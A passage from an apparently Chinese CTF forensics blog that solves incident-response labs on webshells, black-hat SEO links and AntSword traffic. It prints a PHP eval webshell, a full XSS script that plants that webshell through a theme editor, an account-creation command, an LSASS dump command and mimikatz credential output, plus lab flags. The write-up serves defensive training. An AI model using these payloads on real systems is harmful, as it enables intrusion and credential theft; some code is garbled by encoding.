ed2b3e3ce2425550d8bfdea8b80cc89a |        0 | 192.168.20.131 |  1709796233 |           0 |              0 |           8 |            0 |            |                                                                                                                              |                    |              |                                                                                                                                                                                              |             |            |           |             |                                                         |          0 |            |<br>+--------+------------+-------------+-----------------+----------------+----------------------------------+----------+----------------+-------------+-------------+----------------+-------------+--------------+------------+------------------------------------------------------------------------------------------------------------------------------+--------------------+--------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------+------------+-----------+-------------+---------------------------------------------------------+------------+------------+<br>4 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">f<span class="hljs-number">6</span>f<span class="hljs-number">6</span>eb<span class="hljs-number">5</span>ace<span class="hljs-number">977</span>d<span class="hljs-number">7e114377</span><span class="hljs-keyword">cc</span><span class="hljs-number">7098</span>b<span class="hljs-number">7e3</span> <br>flag&#123;Network<span class="hljs-title">@2020</span>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q3-11"><a class="markdownIt-Anchor" href="#q3-11"></a> Q3</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">通过本地 PC SSH到服务器并且分析黑客第一次Webshell的连接URL为多少,将黑客第一次Webshell的连接URL作为 FLAG 提交(无需域名flag&#123;xxx.php?abc-app-upload&#125;);<br></code></pre></td></tr></table></figure>
<p>把流量包下载下来看一下，前面都是这个路由</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">flag&#123;index.php?user-app-register&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q4-11"><a class="markdownIt-Anchor" href="#q4-11"></a> Q4</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">通过本地 PC SSH到服务器并且分析黑客Webshell连接密码多少,将黑客Webshell连接密码 作为 FLAG 提交;<br></code></pre></td></tr></table></figure>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-09131415.png" srcset="/img/loading.gif" lazyload alt="2025-03-09131415"></p>
<p>先看到了这个，没啥用</p>
<p>分析一下，对于上题的url进行tcp追踪开头就是答案</p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;Network2020&#125;</span><br></code></pre></td></tr></table></figure>
<h2 id="q5-9"><a class="markdownIt-Anchor" href="#q5-9"></a> Q5</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">通过本地 PC SSH到服务器并且分析黑客使用的后续上传的木马文件名称为多少,将黑客使用的后续上传的木马文件名称 作为 FLAG 提交;<br></code></pre></td></tr></table></figure>
<p><img src="../../images/%E7%8E%84%E6%9C%BA//2025-03-09131731.png" srcset="/img/loading.gif" lazyload alt="2025-03-09131731"></p>
<p>后面都是这个路由了</p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;version2.php&#125;</span><br></code></pre></td></tr></table></figure>
<h2 id="q6-2"><a class="markdownIt-Anchor" href="#q6-2"></a> Q6</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">通过本地 PC SSH到服务器并且分析黑客隐藏的flag2,将黑客使隐藏的flag2 作为 FLAG 提交;<br></code></pre></td></tr></table></figure>
<p>先写出来的q7，可以看到历史记录，按照流程跟踪到这</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ip-10-0-10-1 .api]# <span class="hljs-built_in">cat</span> alinotify.php<br>&lt;?php<br>namespace PHPEMS;<br>/*<br> * Created on 2013-12-26<br> *<br> * To change the template <span class="hljs-keyword">for</span> this generated file go to<br> * Window - Preferences - PHPeclipse - PHP - Code Templates<br> */<br><br>define(<span class="hljs-string">&#x27;PEPATH&#x27;</span>,<span class="hljs-built_in">dirname</span>(<span class="hljs-built_in">dirname</span>(__FILE__)));<br>class app<br>&#123;<br>        public <span class="hljs-variable">$G</span>;<br><br>        public <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">__construct</span></span>()<br>        &#123;<br><br><br>                <span class="hljs-variable">$this</span>-&gt;ev = \PHPEMS\ginkgo::make(<span class="hljs-string">&#x27;ev&#x27;</span>);<br>                <span class="hljs-variable">$this</span>-&gt;order = \PHPEMS\ginkgo::make(<span class="hljs-string">&#x27;orders&#x27;</span>,<span class="hljs-string">&#x27;bank&#x27;</span>);<br>        &#125;<br><br>        public <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">run</span></span>()<br>        &#123;<br>                <span class="hljs-variable">$alipay</span> = \PHPEMS\ginkgo::make(<span class="hljs-string">&#x27;alipay&#x27;</span>);<br>                <span class="hljs-variable">$orderid</span> = <span class="hljs-variable">$this</span>-&gt;ev-&gt;get(<span class="hljs-string">&#x27;out_trade_no&#x27;</span>);<br>                <span class="hljs-variable">$order</span> = <span class="hljs-variable">$this</span>-&gt;order-&gt;getOrderById(<span class="hljs-variable">$orderid</span>);<br>                <span class="hljs-variable">$verify_result</span> = <span class="hljs-variable">$alipay</span>-&gt;alinotify();<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$verify_result</span>)<br>                &#123;<br>                        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$this</span>-&gt;ev-&gt;get(<span class="hljs-string">&#x27;trade_status&#x27;</span>) == <span class="hljs-string">&#x27;TRADE_FINISHED&#x27;</span> ||<span class="hljs-variable">$this</span>-&gt;ev-&gt;get(<span class="hljs-string">&#x27;trade_status&#x27;</span>) == <span class="hljs-string">&#x27;TRADE_SUCCESS&#x27;</span>)<br>                        &#123;<br>                                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$order</span>[<span class="hljs-string">&#x27;orderstatus&#x27;</span>] != 2)<br>                                &#123;<br>                    <span class="hljs-variable">$this</span>-&gt;order-&gt;payforOrder(<span class="hljs-variable">$orderid</span>,<span class="hljs-string">&#x27;alipay&#x27;</span>);<br>                                &#125;<br>                                <span class="hljs-built_in">exit</span>(<span class="hljs-string">&#x27;sucess&#x27;</span>);<br>                        &#125;<br>                        elseif(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;trade_status&#x27;</span>] == <span class="hljs-string">&#x27;WAIT_BUYER_PAY&#x27;</span>)<br>                        &#123;<br>                                <span class="hljs-built_in">exit</span>(<span class="hljs-string">&#x27;fail&#x27;</span>);<br>                        &#125;<br>                        <span class="hljs-keyword">else</span><br>                        &#123;<br>                                <span class="hljs-built_in">exit</span>(<span class="hljs-string">&#x27;fail&#x27;</span>);<br>                        &#125;<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                        <span class="hljs-built_in">exit</span>(<span class="hljs-string">&#x27;fail&#x27;</span>);<br>                &#125;<br>        &#125;<br>&#125;<br><br>include PEPATH.<span class="hljs-string">&#x27;/lib/init.cls.php&#x27;</span>;<br><span class="hljs-variable">$app</span> = new app(new ginkgo);<br><span class="hljs-variable">$app</span>-&gt;run();<br><span class="hljs-variable">$flag2</span> = <span class="hljs-string">&quot;flag&#123;bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9&#125;&quot;</span>;<br><br>?&gt;<br></code></pre></td></tr></table></figure>
<h2 id="q7-2"><a class="markdownIt-Anchor" href="#q7-2"></a> Q7</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">通过本地 PC SSH到服务器并且分析黑客隐藏的flag3,将黑客使隐藏的flag3 作为 FLAG 提交;<br></code></pre></td></tr></table></figure>
<p>用history可以得到</p>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-09131913.png" srcset="/img/loading.gif" lazyload alt="2025-03-09131913"></p>
<p>或者</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ip-10-0-10-1 ~]# find ./ -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">exec</span> grep <span class="hljs-string">&quot;flag&#123;&quot;</span> &#123;&#125; +<br>./.bash_history:<span class="hljs-variable">$flag3</span> = flag&#123;5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ&#125;<br>Binary file ./wp matches<br></code></pre></td></tr></table></figure>
<h1 id="第五章-linux实战-黑链"><a class="markdownIt-Anchor" href="#第五章-linux实战-黑链"></a> 第五章 linux实战-黑链</h1>
<p><strong>黑链（Black Hat SEO Links）</strong> 是指通过不正当手段在网页中植入隐藏的、非法的或恶意的链接，通常用于操纵搜索引擎排名或传播恶意内容。黑链是黑帽 SEO（Black Hat SEO）的一种常见手段，违反了搜索引擎的规则和道德准则</p>
<h2 id="q1-12"><a class="markdownIt-Anchor" href="#q1-12"></a> Q1</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">找到黑链添加在哪个文件 flag 格式 flag&#123;xxx.xxx&#125;<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-3:~# grep -rnw <span class="hljs-string">&#x27;/var/www/html/&#x27;</span> -e <span class="hljs-string">&#x27;黑链&#x27;</span><br>/var/www/html/usr/themes/default/header.php:24:&lt;h3 style=<span class="hljs-string">&quot;text-align:center&quot;</span>&gt;模拟黑链&lt;/h3&gt;<br>Binary file /var/www/html/www.tar matches<br></code></pre></td></tr></table></figure>
<p>在指定目录中递归搜索包含特定关键词</p>
<h2 id="q2-12"><a class="markdownIt-Anchor" href="#q2-12"></a> Q2</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">webshell的绝对路径 flag&#123;xxxx/xxx/xxx/xxx/&#125;<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">rootàip-10-0-10-3:/var/www/htmlù find . -name <span class="hljs-string">&quot;*.php&quot;</span> -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">exec</span> grep -Hn <span class="hljs-string">&quot;eval(&quot;</span> äü ç; 2&gt;/dev/null<br>./usr/themes/default/404.php:2:&lt;?php à<span class="hljs-built_in">eval</span>($èPOSTéaê); ?&gt;<br>./usr/themes/default/404.php:3:&lt;?php à<span class="hljs-built_in">eval</span>($èPOSTéaê); ?&gt;<br>./usr/themes/default/404.php:4:&lt;?php à<span class="hljs-built_in">eval</span>($èPOSTéaê); ?&gt;<br>./usr/themes/default/404.php:5:&lt;?php à<span class="hljs-built_in">eval</span>($èPOSTéaê); ?&gt;<br>./usr/themes/default/404.php:6:&lt;?php à<span class="hljs-built_in">eval</span>($èPOSTéaê); ?&gt;<br>./usr/themes/default/404.php:7:&lt;?php à<span class="hljs-built_in">eval</span>($èPOSTéaê); ?&gt;<br>./var/Typecho/I18n/GetText.php:372:        <span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;<span class="hljs-variable">$string</span>&quot;</span>);<br></code></pre></td></tr></table></figure>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">flag&#123;<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/u</span>sr<span class="hljs-regexp">/themes/</span><span class="hljs-keyword">default</span>/<span class="hljs-number">404</span>.php&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q3-12"><a class="markdownIt-Anchor" href="#q3-12"></a> Q3</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">黑客注入黑链文件的 md5 md5sum file flag&#123;md5&#125;<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs bash">rootàip-10-0-10-3:/var/www/htmlù <span class="hljs-built_in">cat</span> poc1.js<br>// 定义一个函数，在网页末尾插入一个iframe元素<br><span class="hljs-keyword">function</span> insertIframe() ä<br>    // 获取当前页面路径<br>    var urlWithoutDomain = window.location.pathname;<br>    // 判断页面是否为评论管理页面<br>    var hasManageComments = urlWithoutDomain.includes(<span class="hljs-string">&quot;manage-comments.php&quot;</span>);<br>    var tSrc=<span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (hasManageComments)ä<br>        // 如果是，则将路径修改为用于修改主题文件的页面地址<br>        tSrc=urlWithoutDomain.replace(<span class="hljs-string">&#x27;manage-comments.php&#x27;</span>,<span class="hljs-string">&#x27;theme-editor.php?theme=default&amp;file=404.php&#x27;</span>);<br>    ü<span class="hljs-keyword">else</span>ä<br>        // 如果不是，则直接使用主题文件修改页面地址<br>        tSrc=<span class="hljs-string">&#x27;/admin/theme-editor.php?theme=default&amp;file=404.php&#x27;</span>;<br>    ü<br>    // 定义iframe元素的属性，包括<span class="hljs-built_in">id</span>、src、width、height和onload事件<br>    var iframeAttributes = <span class="hljs-string">&quot;&lt;iframe id=&#x27;themeèid&#x27; src=&#x27;&quot;</span>+tSrc+<span class="hljs-string">&quot;&#x27; width=&#x27;0%&#x27; height=&#x27;0%&#x27; onload=&#x27;writeShell()&#x27;&gt;&lt;/iframe&gt;&quot;</span>;<br>    // 获取网页原始内容<br>    var originalContent = document.body.innerHTML;<br>    // 在网页末尾添加iframe元素<br>    document.body.innerHTML = (originalContent + iframeAttributes);<br>ü<br><br>// 定义一个全局变量isSaved，初始值为<span class="hljs-literal">false</span><br>var isSaved = <span class="hljs-literal">false</span>;<br><br>// 定义一个函数，在iframe中写入一段PHP代码并保存<br><span class="hljs-keyword">function</span> writeShell() ä<br>    // 如果isSaved为<span class="hljs-literal">false</span><br>    <span class="hljs-keyword">if</span> (!isSaved) ä <br>        // 获取iframe内的内容区域和“保存文件”按钮元素<br>        var content = document.getElementById(<span class="hljs-string">&#x27;themeèid&#x27;</span>).contentWindow.document.getElementById(<span class="hljs-string">&#x27;content&#x27;</span>);<br>        var btns = document.getElementById(<span class="hljs-string">&#x27;themeèid&#x27;</span>).contentWindow.document.getElementsByTagName(<span class="hljs-string">&#x27;button&#x27;</span>);    <br>        // 获取模板文件原始内容<br>        var oldData = content.value;<br>        // 在原始内容前加入一段phpinfo代码<br>        content.value = (<span class="hljs-string">&#x27;&lt;?php àeval($èPOSTéaê); ?&gt;çn&#x27;</span>) + oldData;<br>        // 点击“保存文件”按钮<br>        btnsé1ê.click();<br>        // 将isSaved设为<span class="hljs-literal">true</span>，表示已经完成写入操作<br>        isSaved = <span class="hljs-literal">true</span>;<br>    ü<br>ü<br>// 调用insertIframe函数，向网页中添加iframe元素和写入PHP���码的事件<br>insertIframe();rootàip-10-0-10-3:/var/www/htmlù <span class="hljs-built_in">md5sum</span> poc1.js<br>10c18029294fdec7b6ddab76d9367c14  poc1.js<br></code></pre></td></tr></table></figure>
<h2 id="q4-12"><a class="markdownIt-Anchor" href="#q4-12"></a> Q4</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">攻击入口是哪里？url请求路径，最后面加/ flag&#123;/xxxx.xxx/xxxx/x/&#125;<br></code></pre></td></tr></table></figure>
<p>下载流量包快速定位<code>http contains &quot;poc1.js&quot;</code>,进行简单的分析一下就有了(爆破fuzz一下也行（bushi</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">flag&#123;<span class="hljs-regexp">/index.php/</span>archives<span class="hljs-regexp">/1/</span>&#125;<br></code></pre></td></tr></table></figure>
<h1 id="第六章-流量特征分析-蚁剑流量分析"><a class="markdownIt-Anchor" href="#第六章-流量特征分析-蚁剑流量分析"></a> 第六章 流量特征分析-蚁剑流量分析</h1>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown">1.木马的连接密码是多少<br>2.黑客执行的第一个命令是什么<br>3.黑客读取了哪个文件的内容，提交文件绝对路径<br>4.黑客上传了什么文件到服务器，提交文件名<br>5.黑客上传的文件内容是什么<br>6.黑客下载了哪个文件，提交文件绝对路径<br></code></pre></td></tr></table></figure>
<p>可以先去先知了解一下蚁剑流量</p>
<h2 id="q1-13"><a class="markdownIt-Anchor" href="#q1-13"></a> Q1</h2>
<p>http过滤，tcp追踪，第一个开头就是flag</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">1</span>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q2-13"><a class="markdownIt-Anchor" href="#q2-13"></a> Q2</h2>
<p><img src="../../images/%E7%8E%84%E6%9C%BA//2025-03-09144418.png" srcset="/img/loading.gif" lazyload alt="2025-03-09144418"></p>
<figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fsharp"><span class="hljs-keyword">flag</span>&#123;<span class="hljs-built_in">id</span>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q3-13"><a class="markdownIt-Anchor" href="#q3-13"></a> Q3</h2>
<p>主要就是分析最后的base64编码，去掉开头两个字符</p>
<p><img src="../../images/%E7%8E%84%E6%9C%BA//2025-03-09144706.png" srcset="/img/loading.gif" lazyload alt="2025-03-09144706"></p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-tag">&#123;/<span class="hljs-name">etc</span>/passwd&#125;</span><br></code></pre></td></tr></table></figure>
<h2 id="q4-13"><a class="markdownIt-Anchor" href="#q4-13"></a> Q4</h2>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-09144751.png" srcset="/img/loading.gif" lazyload alt="2025-03-09144751"></p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;flag.txt&#125;</span><br></code></pre></td></tr></table></figure>
<h2 id="q5-10"><a class="markdownIt-Anchor" href="#q5-10"></a> Q5</h2>
<p>上面这条流量包全复制到厨子了，一眼666开头</p>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-09144848.png" srcset="/img/loading.gif" lazyload alt="2025-03-09144848"></p>
<h2 id="q6-3"><a class="markdownIt-Anchor" href="#q6-3"></a> Q6</h2>
<p>往下翻两条流量</p>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-09144948.png" srcset="/img/loading.gif" lazyload alt="2025-03-09144948"></p>
<h1 id="第六章-流量特征分析-蚂蚁爱上树"><a class="markdownIt-Anchor" href="#第六章-流量特征分析-蚂蚁爱上树"></a> 第六章 流量特征分析-蚂蚁爱上树</h1>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown">应急响应小组成员老狼在 waf 上下载了一段流量，请你分析黑客攻击手法，并且解答下面问题<br><span class="hljs-bullet">1.</span> 管理员Admin账号的密码是什么？<br><span class="hljs-bullet">2.</span> LSASS.exe的程序进程ID是多少？<br><span class="hljs-bullet">3.</span> 用户WIN101的密码是什么?<br></code></pre></td></tr></table></figure>
<h2 id="q1-14"><a class="markdownIt-Anchor" href="#q1-14"></a> Q1</h2>
<p>先搜索看看password没有，然后<code>http.request.method == &quot;POST&quot;</code></p>
<p>这里包大的都是<code>product2.php</code>再过滤一下</p>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-09153059.png" srcset="/img/loading.gif" lazyload alt="2025-03-09153059"></p>
<p>从前往后慢慢找，流程大约是在windows上创建了一个用户</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Y2QgL2QgIkM6XFxwaHBTdHVkeVxcUEhQVHV0b3JpYWxcXFdXV1xcb25saW5lc2hvcCImbmV0IHVzZXIgYWRtaW4gUGFzc3dvcmQxIC9hZGQmZWNobyBbU10mY2QmZWNobyBbRV0=<br><span class="hljs-built_in">cd</span> /d <span class="hljs-string">&quot;C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop&quot;</span>&amp;net user admin Password1 /add&amp;<span class="hljs-built_in">echo</span> [S]&amp;<span class="hljs-built_in">cd</span>&amp;<span class="hljs-built_in">echo</span> [E]<br></code></pre></td></tr></table></figure>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;password1&#125;</span><br></code></pre></td></tr></table></figure>
<h2 id="q2-14"><a class="markdownIt-Anchor" href="#q2-14"></a> Q2</h2>
<p>和上题流程基本一致,往下翻就是了</p>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-09154748.png" srcset="/img/loading.gif" lazyload alt="2025-03-09154748"></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">852</span>&#125;<br></code></pre></td></tr></table></figure>
<p>这边引用perterpan师傅的分析流程</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Rundll32.exe<br><br>rundll32.exe 是 Windows 操作系统中的一个实用程序，允许用户通过命令行运行基于 DLL 的函数。攻击者可以利用这个合法的系统工具来执行恶意操作，例如调用特定 DLL 文件中的函数来执行恶意代码。<br><br>comsvcs.dll 和 MiniDump 函数<br><br>comsvcs.dll 是 Windows 系统中的一个 DLL 文件，包含与 COM+ 服务相关的功能。这个 DLL 文件中的 MiniDump 函数可以用来创建内存转储文件（memory dump），这些文件包含了系统内存的快照，可能包括敏感信息，如用户凭证。<br><br>攻击流程<br><br>调用 rundll32.exe 攻击者使用 rundll32.exe 来调用 comsvcs.dll 中的 MiniDump 函数。命令格式如下：<br><br>rundll32.exe comsvcs.dll, MiniDump <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">PID</span>&gt;</span></span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">DUMP_FILE_PATH</span>&gt;</span></span> full<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">PID</span>&gt;</span></span> 是目标进程的进程 ID，例如 LSASS 的进程 ID。<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">DUMP_FILE_PATH</span>&gt;</span></span> 是要生成的转储文件路径，例如 C:\Windows\Temp\lsass.dmp。<br>生成 lsass.dmp 文件 这个命令会生成一个包含 LSASS 进程内存内容的转储文件，通常命名为 lsass.dmp。LSASS 进程管理着系统的用户凭证，因此这个转储文件可能包含敏感信息，如密码哈希。<br><br>使用 Mimikatz 读取凭证 攻击者随后使用 Mimikatz 等工具来读取和提取转储文件中的凭证。Mimikatz 是一个广泛使用的安全工具，可以从明。<br><span class="hljs-code">                        </span><br><span class="hljs-code">原文链接：https://blog.csdn.net/administratorlws/article/details/139946448</span><br></code></pre></td></tr></table></figure>
<h2 id="q3-14"><a class="markdownIt-Anchor" href="#q3-14"></a> Q3</h2>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-09160559.png" srcset="/img/loading.gif" lazyload alt="2025-03-09160559"></p>
<p>先导出文件利用010去头改为dmp，然后使用mimikatz得到数据</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">mimikatz</span> <span class="hljs-comment"># sekurlsa::minidump C:\Users\0raN9e\Desktop\a.dmp</span><br><span class="hljs-attr">Switch to MINIDUMP :</span> <span class="hljs-string">&#x27;C:\Users\0raN9e\Desktop\a.dmp&#x27;</span><br><br><span class="hljs-string">mimikatz</span> <span class="hljs-comment"># sekurlsa::logonpasswords</span><br><span class="hljs-attr">Opening :</span> <span class="hljs-string">&#x27;C:\Users\0raN9e\Desktop\a.dmp&#x27;</span> <span class="hljs-string">file</span> <span class="hljs-string">for</span> <span class="hljs-string">minidump...</span><br><br><span class="hljs-attr">Authentication Id :</span> <span class="hljs-number">0</span> <span class="hljs-string">;</span> <span class="hljs-number">1183799</span> <span class="hljs-string">(00000000:00121037)</span><br><span class="hljs-attr">Session           :</span> <span class="hljs-string">Interactive</span> <span class="hljs-string">from</span> <span class="hljs-number">1</span><br><span class="hljs-attr">User Name         :</span> <span class="hljs-string">win101</span><br><span class="hljs-attr">Domain            :</span> <span class="hljs-string">VULNTARGET</span><br><span class="hljs-attr">Logon Server      :</span> <span class="hljs-string">WIN-UH20PRD3EAO</span><br><span class="hljs-attr">Logon Time        :</span> <span class="hljs-number">2023</span><span class="hljs-string">/10/19</span> <span class="hljs-number">11</span><span class="hljs-string">:35:08</span><br><span class="hljs-attr">SID               :</span> <span class="hljs-string">S-1-5-21-3374851086-947483859-3378876003-1103</span><br>        <span class="hljs-attr">msv :</span><br>         [<span class="hljs-number">00000003</span>] <span class="hljs-string">Primary</span><br>         <span class="hljs-string">*</span> <span class="hljs-attr">Username :</span> <span class="hljs-string">win101</span><br>         <span class="hljs-string">*</span> <span 